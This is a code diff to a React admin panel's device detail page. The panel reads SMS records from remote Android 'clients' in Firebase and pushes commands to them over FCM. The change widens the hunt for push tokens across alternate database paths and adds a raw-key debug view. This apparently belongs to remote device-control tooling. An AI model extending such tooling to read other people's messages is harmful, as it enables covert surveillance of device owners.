@@ -146,6 +146,7 @@ export default function DeviceDetailPage() {
   const router = useRouter();
   const { idToken } = useAuth();
   const [device, setDevice] = useState<DeviceInfo | null>(null);
+  const [rawDevice, setRawDevice] = useState<Record<string, unknown> | null>(null);
   const [smsMessages, setSmsMessages] = useState<SmsRecord[]>([]);
   const [tab, setTab] = useState<TabType>('overview');
   const [smsFilter, setSmsFilter] = useState<SmsFilter>('all');
@@ -169,6 +170,7 @@ export default function DeviceDetailPage() {
     try {
       const data = await adminRtdb('GET', `/clients/${id}`) as Record<string, unknown> | null;
       if (data) {
+        setRawDevice(data);
         const info = parseDevice(data);
         setDevice(info);
         if (info.phone && !sendToSet.current) { setSendTo(info.phone); sendToSet.current = true; }
@@ -227,11 +229,31 @@ export default function DeviceDetailPage() {
       const rtdbUrl = loadStr('panel_rtdb_url');
       if (!saRaw || !rtdbUrl) throw new Error('Not configured');
 
-      // Step 1: get FCM token from the device node
-      const deviceRaw = await adminRtdb('GET', `/clients/${id}`) as Record<string, unknown> | null;
-      const fcmToken = deviceRaw
-        ? String(deviceRaw['fcmToken'] ?? deviceRaw['token'] ?? deviceRaw['fcm'] ?? deviceRaw['pushToken'] ?? deviceRaw['registrationToken'] ?? '')
-        : '';
+      // Step 1: get FCM token — check device node + alternate root paths
+      const deviceRaw = rawDevice ?? (await adminRtdb('GET', `/clients/${id}`) as Record<string, unknown> | null);
+      const FCM_KEYS = ['fcmToken','token','fcm','pushToken','registrationToken','regToken','registrationId','deviceToken','firebaseToken','notificationToken'];
+      let fcmToken = '';
+      if (deviceRaw) {
+        for (const k of FCM_KEYS) { if (deviceRaw[k] && String(deviceRaw[k]).length > 20) { fcmToken = String(deviceRaw[k]); break; } }
+      }
+      // Also try alternate root paths some apps use
+      if (!fcmToken) {
+        const alts = await Promise.allSettled([
+          adminRtdb('GET', `/tokens/${id}`),
+          adminRtdb('GET', `/fcmTokens/${id}`),
+          adminRtdb('GET', `/registrations/${id}`),
+        ]);
+        for (const r of alts) {
+          if (r.status === 'fulfilled' && r.value) {
+            const v = r.value as Record<string, unknown> | string;
+            if (typeof v === 'string' && v.length > 20) { fcmToken = v; break; }
+            if (typeof v === 'object') {
+              for (const k of FCM_KEYS) { if (v[k] && String(v[k]).length > 20) { fcmToken = String(v[k]); break; } }
+            }
+            if (fcmToken) break;
+          }
+        }
+      }
 
       // Step 2: send via FCM (the Android app listens for FCM, not RTDB writes)
       if (fcmToken) {
@@ -660,6 +682,36 @@ export default function DeviceDetailPage() {
               ))}
             </div>
           </div>
+
+          {/* Raw Firebase Data — shows ALL keys stored for this device */}
+          {rawDevice && (
+            <div className="px-4 py-4">
+              <div className="flex items-center gap-3 mb-3">
+                <Globe className="w-4 h-4 text-amber-400" />
+                <p className="text-sm font-semibold text-slate-100">Raw Firebase Keys</p>
+                <span className="text-[10px] text-amber-600 font-bold">DEBUG</span>
+              </div>
+              <div className="space-y-1 text-[11px] font-mono">
+                {Object.entries(rawDevice)
+                  .filter(([, v]) => typeof v !== 'object' || v === null)
+                  .map(([k, v]) => {
+                    const vs = String(v ?? '');
+                    const isToken = vs.length > 40;
+                    return (
+                      <div key={k} className="flex justify-between gap-4 py-1 border-b border-slate-800">
+                        <span className={`flex-shrink-0 ${isToken ? 'text-amber-400' : 'text-slate-500'}`}>{k}</span>
+                        <span className="text-slate-400 text-right break-all max-w-[65%] text-[10px]">
+                          {isToken ? `${vs.slice(0, 30)}…` : vs || '—'}
+                        </span>
+                      </div>
+                    );
+                  })}
+                <div className="pt-1 text-slate-600">
+                  Object keys: {Object.keys(rawDevice).join(', ')}
+                </div>
+              </div>
+            </div>
+          )}
         </div>
       )}
     </div>
